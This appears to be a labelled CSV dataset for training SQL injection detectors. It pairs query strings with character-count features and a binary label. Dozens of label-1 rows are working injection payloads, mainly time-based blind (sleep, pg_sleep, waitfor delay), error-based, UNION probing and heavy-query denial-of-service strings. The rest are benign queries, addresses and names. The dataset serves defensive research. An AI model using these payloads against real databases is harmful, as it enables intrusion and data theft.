Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,0,0,0,0,0,0,0,0,69,12,0,22,0,0,0,0,0,0,0
"c/ salvatella, 98 11?h",0,0,0,0,0,1,0,0,22,3,4,12,0,0,0,1,0,0,0
"-7146"" where 6431  =  6431 or 8548  =  5549--",1,1,3,0,0,0,2,0,45,12,20,7,0,0,0,0,0,1,1
SELECT part ( s )  FROM cannot LEFT JOIN,0,0,0,0,0,0,0,0,40,9,0,11,2,0,0,0,0,0,0
1'+  (  select 'unpz' where 8186  =  8186,0,0,1,0,0,0,1,0,41,11,9,15,1,0,0,0,3,0,1
"1"" where 5098  =  5098 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,11,2,0,0,0,3,0,355,162,53,80,32,0,0,0,0,1,1
"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,0,0,0,0,2,0,86,36,18,22,5,0,0,1,1,0,1
"  SELECT PERIOD_DIFF ( 201703, 201803 ) ;",0,0,0,0,0,0,0,1,41,8,12,0,2,0,0,1,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",0,1,0,0,0,0,1,0,123,43,14,49,9,1,0,3,3,0,1
SELECT AVG ( Price ) FROM supply,0,0,0,0,0,0,0,0,32,6,0,10,2,0,0,0,0,0,0
SELECT * FROM picture  WHERE second = above,0,0,0,0,0,0,1,0,43,8,0,18,0,0,0,0,0,0,0
que3h5a,0,0,0,0,0,0,0,0,7,0,2,5,0,0,0,0,0,0,0
harmony,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",0,0,0,0,0,0,1,0,147,49,18,65,8,0,0,1,1,0,1
DELETE FROM dozen WHERE claws = 'work',0,0,0,0,0,0,1,0,38,6,0,14,0,0,0,0,2,0,0
yu-chian,0,0,1,0,0,0,0,0,8,0,0,7,0,0,0,0,0,0,0
-4325 order by 1--,1,0,3,0,0,0,0,0,18,3,5,7,0,0,0,0,0,0,1
SELECT COUNT ( DISTINCT worker )  FROM jar,0,0,0,0,0,0,0,0,42,8,0,9,2,0,0,0,0,0,0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,0,2,0,1,1,0,0,89,18,1,54,3,10,0,9,1,0,1
"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,0,2,0,195,45,20,114,4,0,0,6,1,0,1
villaseca de uceda,0,0,0,0,0,0,0,0,18,2,0,16,0,0,0,0,0,0,0
waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,0,1,0,0,0,0,0,0,55,16,3,27,2,0,0,0,5,0,1
"  UPDATE collect SET pocket =  'particular', City =  'rest' WHERE struck =  limited",0,0,0,0,0,0,3,0,83,17,0,43,0,0,0,1,4,0,0
SELECT cost ( s )  FROM hurt LEFT JOIN,0,0,0,0,0,0,0,0,38,9,0,9,2,0,0,0,0,0,0
1   )    )    as syot where 1199  =  1199,0,0,0,0,0,0,1,0,41,18,9,11,2,0,0,0,0,0,1
1  )   as hhly where 2906  =  2906,0,0,0,0,0,0,1,0,34,12,9,11,1,0,0,0,0,0,1
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",0,3,0,0,0,0,2,0,151,57,23,47,10,0,0,1,6,0,1
"1  )   where 9432  =  9432 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,2,0,0,0,2,0,199,49,20,114,5,0,0,6,0,0,1
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",0,2,1,0,0,0,2,0,67,20,16,20,2,0,0,1,0,4,1
"  SELECT Orders.automobilerID, Employees.pure, Employees.just FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fastID ORDER BY Orders.richID",0,0,0,0,0,0,1,0,158,18,0,86,0,0,0,2,0,0,0
"  SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",0,0,0,0,0,0,1,0,107,15,0,57,0,0,0,2,2,0,0
9ot87ico,0,0,0,0,0,0,0,0,8,0,3,5,0,0,0,0,0,0,0
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,1,0,0,0,1,0,205,83,37,63,15,0,2,3,0,0,1
33180,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,2,0,0,0,2,0,218,88,35,63,18,1,0,3,0,0,1
fulmer,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
oate fijo,0,0,0,0,0,0,0,0,9,1,0,8,0,0,0,0,0,0,0
werkmeister@19horas.zr,0,0,0,0,0,1,0,0,22,0,2,18,0,0,0,0,0,0,0
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,2,0,276,112,37,82,24,2,0,4,1,0,1
8.62225E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"  SELECT mix,iron FROM least WHERE rear = 'terrible' UNION SELECT railroad, everybody FROM is",0,0,0,0,0,0,1,0,93,15,0,43,0,0,0,2,2,0,0
9.83415E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
6.36091E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",0,2,10,0,0,0,2,0,392,183,47,107,38,0,0,1,4,0,1
"1%' union all select null,null,null,null,null--",1,0,2,0,1,1,0,0,47,4,1,34,0,5,0,4,1,0,1
"1'  )   as bagi where 1281  =  1281   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,3,2,0,0,0,2,0,316,115,42,118,23,1,0,3,1,0,1
SELECT * FROM table WHERE knife BETWEEN speech09/01/1996party AND eager15/31/1996cow,0,0,0,0,0,0,0,0,84,9,16,29,0,0,0,0,0,0,0
SELECT rose ( s FROM glass RIGHT JOIN,0,0,0,0,0,0,0,0,37,7,0,10,1,0,0,0,0,0,0
57879425v,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
valdemoro,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,0,12,1,0,0,2,3,0,346,148,52,83,30,0,0,1,0,4,1
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1,0,2,0,1,2,1,0,76,23,2,40,2,0,0,1,0,0,1
"  SELECT worker AS cabin, broad AS [torn]  FROM breathe",0,0,0,0,0,0,0,0,55,11,0,27,2,0,0,1,0,0,0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt",0,2,0,0,0,0,2,0,147,45,8,76,6,0,0,2,4,0,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",0,2,0,0,0,0,2,0,148,39,9,82,4,0,0,3,4,0,1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,0,2,0,0,0,0,1,0,129,73,10,30,14,0,0,0,0,0,1
1'||  (  select 'xtcb' where 5240  =  5240,0,1,0,0,0,0,1,0,42,11,9,15,1,0,0,0,3,0,1
"  SELECT HOUR ( ""838:59:59"" ) ;",0,0,0,0,0,0,0,1,31,7,7,0,2,0,0,0,0,2,0
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1,0,2,0,0,0,1,0,92,37,14,31,6,0,0,0,0,0,1
"  SELECT SUBSTRING ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0,0,1,0,0,0,0,1,63,12,2,18,2,0,0,2,0,2,0
SELECT COUNT ( DISTINCT stick )  FROM swimming,0,0,0,0,0,0,0,0,46,8,0,13,2,0,0,0,0,0,0
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",0,2,1,0,0,0,1,0,102,46,16,24,8,0,0,1,4,0,1
-1643' where 1968  =  1968 or 3484  =  6642,0,1,1,0,0,0,2,0,43,12,20,7,0,0,0,0,1,0,1
tabaquera,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
SELECT COUNT ( special ) FROM west,0,0,0,0,0,0,0,0,34,6,0,11,2,0,0,0,0,0,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367654 ) ,0,0,0,0,0,0,0,0,56,11,6,14,2,0,0,0,0,0,0
"   SELECT supper, finger, entireFROM slope WHERE here  IS NOT NULL",0,0,0,0,0,0,0,0,66,13,0,27,0,0,0,2,0,0,0
baigent@blueberryminiloaf.com.dj,0,0,0,0,0,1,0,0,32,0,0,29,0,0,0,0,0,0,0
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz",0,12,1,0,0,0,3,0,371,160,48,99,32,0,0,0,0,4,1
"   SELECT zulu, wise, poor FROM poor WHERE with  IS NULL",0,0,0,0,0,0,0,0,56,13,0,20,0,0,0,2,0,0,0
"portugal 87,",0,0,0,0,0,0,0,0,12,1,2,8,0,0,0,1,0,0,0
"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,0,2,0,0,0,2,2,0,130,37,8,67,4,0,0,2,0,4,1
"ignacio aldecoa, 30, 6h",0,0,0,0,0,0,0,0,23,3,3,15,0,0,0,2,0,0,0
SELECT * FROM variety WHERE social = 'business'  OR fur = 'highest',0,0,0,0,0,0,2,0,67,12,0,31,0,0,0,0,4,0,0
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",0,1,10,0,0,0,2,0,345,159,47,92,34,0,0,1,0,0,1
"  SELECT Orders.platesrID, Employees.sister, Employees.round FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.inID ORDER BY Orders.aliveID",0,0,0,0,0,0,1,0,156,18,0,84,0,0,0,2,0,0,0
FROM  ( SELECT DISTINCT mountain FROM uncle ) ,0,0,0,0,0,0,0,0,46,9,0,13,2,0,0,0,0,0,0
SELECT * FROM forth WHERE NOT grew = 'dry'  AND NOT why = 'plus',0,0,0,0,0,0,2,0,64,14,0,19,0,0,0,0,4,0,0
mccreano,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,1,0,0,0,2,0,89,35,18,25,5,0,0,1,1,0,1
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,12,0,0,0,2,0,364,170,55,89,35,0,0,0,1,0,1
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,11,2,0,0,0,3,0,374,174,53,86,34,0,0,0,0,0,1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",0,2,0,0,0,0,1,0,192,77,32,58,14,0,3,4,0,4,1
madisett,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",0,2,0,0,0,0,2,0,149,44,10,73,6,0,0,4,4,0,1
"calle gardenia, 35",0,0,0,0,0,0,0,0,18,2,2,13,0,0,0,1,0,0,0
"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,2,0,0,0,2,0,128,52,23,36,9,0,0,1,2,0,1
aseguir,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
pardos@barcafedaniss.co,0,0,0,0,0,1,0,0,23,0,0,21,0,0,0,0,0,0,0
1'||  (  select 'uiyj' from dual where 8320  =  8320,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
SELECT * FROM program ORDER BY slipped DESC,0,0,0,0,0,0,0,0,43,7,0,14,0,0,0,0,0,0,0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",0,2,0,0,3,0,1,0,348,139,55,114,26,0,2,6,4,0,1
DELETE FROM organization,0,0,0,0,0,0,0,0,24,2,0,12,0,0,0,0,0,0,0
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,2,2,0,0,0,2,1,59,20,4,26,1,0,0,0,0,2,1
5.60169E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM band WHERE simplest BETWEEN individual09/01/1996example AND gradually15/31/1996dress,0,0,0,0,0,0,0,0,98,9,16,43,0,0,0,0,0,0,0
37311,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
1'||  (  select 'npel' from dual where 5258  =  5258,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
"  SELECT nearest,feathers FROM paint WHERE score = 'require' UNION SELECT liquid, young FROM together",0,0,0,0,0,0,1,0,101,15,0,51,0,0,0,2,2,0,0
25187,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT * FROM anywhere WHERE stick = 'bit'  AND City = 'mine',0,0,0,0,0,0,2,0,61,12,0,23,0,0,0,0,4,0,0
SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2637 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC,0,0,0,0,0,0,4,0,350,65,6,175,10,0,0,0,4,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",0,1,0,0,0,0,0,0,120,24,5,75,3,0,0,4,0,3,1
"INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  ",0,0,0,0,0,0,0,0,83,18,0,35,4,0,0,4,6,0,0
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",1,0,2,0,0,0,1,0,110,32,19,48,4,0,0,2,0,0,1
SELECT * FROM noon WHERE combine IN  ( SELECT satellites FROM whom ) ,0,0,0,0,0,0,0,0,69,14,0,25,2,0,0,0,0,0,0
corazones 168,0,0,0,0,0,0,0,0,13,1,3,9,0,0,0,0,0,0,0
"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,2,0,0,1,1,0,84,41,10,20,7,0,0,0,0,1,1
SELECT * FROM where WHERE add NOT LIKE 'engine%',0,0,0,0,0,1,0,0,48,8,0,14,0,0,0,0,2,0,0
guindo vive,0,0,0,0,0,0,0,0,11,1,0,10,0,0,0,0,0,0,0
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,0,2,0,0,0,0,2,0,61,32,17,6,4,0,0,0,0,0,1
"1%""   )    )    union all select null,null,null,null,null#",0,0,0,0,1,1,0,0,58,14,1,34,2,5,0,4,0,1,1
mamakos@palodegolf.com.rw,0,0,0,0,0,1,0,0,25,0,0,22,0,0,0,0,0,0,0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",0,0,1,0,1,0,0,0,64,8,32,14,1,0,0,6,0,1,1
SELECT * FROM chest 3 SELECT * FROM definition,0,0,0,0,0,0,0,0,46,8,1,15,0,0,0,0,0,0,0
1%'  )   and 7533  =  7533 and   (  '%'  =  ',0,2,0,0,0,2,2,0,45,20,9,6,2,0,0,0,4,0,1
FROM  ( SELECT DISTINCT six FROM thrown ) ,0,0,0,0,0,0,0,0,42,9,0,9,2,0,0,0,0,0,0
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,4,2,0,0,0,1,0,127,50,15,37,11,0,0,1,1,0,1
select case when 1613  =  2937 then 1 else null end--,1,0,2,0,0,0,1,0,53,12,9,29,0,1,0,0,0,0,1
clever,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
giertych,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"  SELECT hiddenID AS ID, aid AS fell FROM bet",0,0,0,0,0,0,0,0,45,10,0,16,0,0,0,1,0,0,0
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",0,1,0,0,0,0,1,0,210,70,37,81,12,0,3,5,0,4,1
" SELECT column_name ( s )  FROM father,wide",0,0,0,0,0,0,0,0,43,8,0,21,2,0,0,1,0,0,0
SELECT TOP 3 * FROM therefore,0,0,0,0,0,0,0,0,29,5,1,9,0,0,0,0,0,0,0
9043,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,0,0,0,0,0,0,2,0,112,35,1,45,4,0,0,0,3,0,1
"  SELECT recently,setting FROM century WHERE be = 'solve' UNION SELECT avoid, addition FROM front",0,0,0,0,0,0,1,0,97,15,0,47,0,0,0,2,2,0,0
6.45831E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
-3597'   )    )    order by 1--,1,0,3,0,0,0,0,0,31,13,5,7,2,0,0,0,1,0,1
"-4413%'   )    )    union all select 1345,1345#",0,0,1,0,1,1,0,0,47,14,12,14,2,0,0,1,1,0,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",0,1,0,0,0,0,1,0,86,29,16,32,5,0,0,1,0,0,1
9423,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",0,2,1,0,0,0,1,0,55,18,12,17,2,0,0,0,0,4,1
SELECT * FROM brother WHERE occasionally = 'visitor' LIMIT 3,0,0,0,0,0,0,1,0,60,9,1,26,0,0,0,0,2,0,0
lopiano,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,0,1,0,0,0,2,1,0,50,24,2,13,4,0,0,0,0,4,1
" SELECT column_name ( s )  FROM realize,needed",0,0,0,0,0,0,0,0,46,8,0,24,2,0,0,1,0,0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4982 )  ORDER BY meta_id ASC",0,0,0,0,0,0,0,0,102,17,4,44,2,0,0,2,0,0,0
SELECT stage ( s ) FROM guess INNER JOIN,0,0,0,0,0,0,0,0,40,8,0,11,2,0,0,0,0,0,0
SELECT * FROM automobile 3,0,0,0,0,0,0,0,0,26,4,1,10,0,0,0,0,0,0,0
SELECT * FROM bread WHERE easier = 'affect'  AND City = 'foot',0,0,0,0,0,0,2,0,62,12,0,24,0,0,0,0,4,0,0
limburg@estoespresto.cd,0,0,0,0,0,1,0,0,23,0,0,21,0,0,0,0,0,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",0,1,0,0,0,0,1,0,114,22,5,71,2,0,0,4,3,0,1
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,0,2,0,1,1,0,0,79,18,1,46,3,8,0,7,1,0,1
or 2 between 1 and 3,0,1,0,0,0,0,0,0,20,5,3,12,0,0,0,0,0,0,1
SELECT * FROM relationship,0,0,0,0,0,0,0,0,26,3,0,12,0,0,0,0,0,0,0
"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,2,0,0,0,2,0,166,61,43,41,11,0,3,5,1,0,1
1'+  (  select 'uqaf' where 7414  =  7414,0,0,1,0,0,0,1,0,41,11,9,15,1,0,0,0,3,0,1
jabbari,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
h2lmi0to,0,0,0,0,0,0,0,0,8,0,2,6,0,0,0,0,0,0,0
"  SELECT modern AS forty, belong AS [done]  FROM dozen",0,0,0,0,0,0,0,0,54,11,0,26,2,0,0,1,0,0,0
" SELECT * FROM station ORDER BY bark, won",0,0,0,0,0,0,0,0,41,8,0,14,0,0,0,1,0,0,0
"   SELECT move, face, telephoneFROM how WHERE model  IS NOT NULL",0,0,0,0,0,0,0,0,64,13,0,25,0,0,0,2,0,0,0
"   SELECT COUNT ( cup ) , ate FROM number BY sugar",0,0,0,0,0,0,0,0,50,13,0,17,2,0,0,1,0,0,0
12,0,0,0,0,0,0,0,0,2,0,2,0,0,0,0,0,0,0,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",0,6,0,0,0,0,1,0,234,94,29,71,22,2,0,4,1,0,1
eoin,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
"comandante barja 84,",0,0,0,0,0,0,0,0,20,2,2,15,0,0,0,1,0,0,0
SELECT TOP 3 * FROM race,0,0,0,0,0,0,0,0,24,5,1,4,0,0,0,0,0,0,0
"c/ arbitro eduardo vidal torres, 12, 4c",0,0,0,0,0,0,0,0,39,6,3,27,0,0,0,2,0,0,0
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,1,2,0,1,2,1,0,81,24,3,40,2,0,0,1,3,0,1
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,0,11,1,0,0,0,2,0,340,159,48,74,33,0,0,0,1,0,1
"1%""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,0,15,0,0,0,2,3,0,421,191,51,104,40,0,0,0,0,4,1
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,0,2,0,0,0,2,0,134,58,21,42,8,0,1,0,1,0,1
6h11a3rud9,0,0,0,0,0,0,0,0,10,0,5,5,0,0,0,0,0,0,0
1 and sleep  (  5  )  #,0,1,0,0,0,0,0,0,23,10,2,8,2,0,0,0,0,0,1
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,0,0,0,0,0,144,54,23,50,12,0,2,4,0,0,1
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,2,0,0,0,2,0,145,37,16,77,4,0,0,2,0,1,1
"c/ pintor viver s/n, 1?b",0,0,0,0,0,1,0,0,24,4,1,15,0,0,0,1,0,0,0
